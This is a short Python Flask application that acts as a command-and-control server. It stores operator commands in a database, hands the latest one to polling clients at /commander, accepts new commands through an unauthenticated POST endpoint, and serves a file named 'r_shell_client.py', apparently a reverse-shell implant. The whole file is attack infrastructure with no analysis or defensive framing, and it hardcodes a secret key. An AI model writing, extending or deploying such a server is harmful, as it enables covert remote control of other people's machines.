import flask
from flask_sqlalchemy import SQLAlchemy

app = flask.Flask(__name__)

app.config["SQLALCHEMY_DATABASE_URI"] = "sqlite:///site.db"
app.config["SECRET_KEY"] = "siuuuuuuuuuuuuu"

db = SQLAlchemy(app)


class Command(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    command = db.Column(db.String)


@app.route("/commander")
def commander():
    try:
        return Command.query.all()[-1].command
    except IndexError:
        return "No Action"


@app.route("/update_command", methods=["POST"])
def update_command():
    command = flask.request.values["command"]
    new_command_instance = Command(command=command)

    db.session.add(new_command_instance)
    db.session.commit()

    return "Action Executed"


@app.route("/client-pack")
def client_pack():
    return flask.send_file("r_shell_client.py")
